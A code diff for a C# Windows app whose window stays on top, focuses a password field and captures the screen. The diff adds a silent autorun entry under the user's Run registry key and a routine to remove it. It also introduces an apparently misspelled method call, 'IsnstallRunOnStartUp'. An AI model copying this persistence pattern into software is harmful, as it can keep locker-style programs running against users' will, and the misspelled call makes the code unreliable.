@@ -22,7 +22,7 @@ namespace C
         public MainWindow()
         {
             InitializeComponent();
-            InstallRunOnStartUp();
+            IsnstallRunOnStartUp();
             this.Topmost = true;
             txtPassword.Focus();
             Utils.CaptureScreen();
@@ -242,8 +242,18 @@ namespace C
             try
             {
                 Microsoft.Win32.RegistryKey? key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-                Assembly curAssembly = Assembly.GetExecutingAssembly();
-                key.SetValue(curAssembly.GetName().Name, curAssembly.Location);
+                string str = Assembly.GetExecutingAssembly().Location;
+                key.SetValue("C", str.Substring(0,str.Length-3) + "exe");
+            }
+            catch { }
+        }
+
+        private void UninstallRunOnStartUp()
+        {
+            try
+            {
+                Microsoft.Win32.RegistryKey? key = Microsoft.Win32.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
+                key.DeleteValue("C");
             }
             catch { }
         }
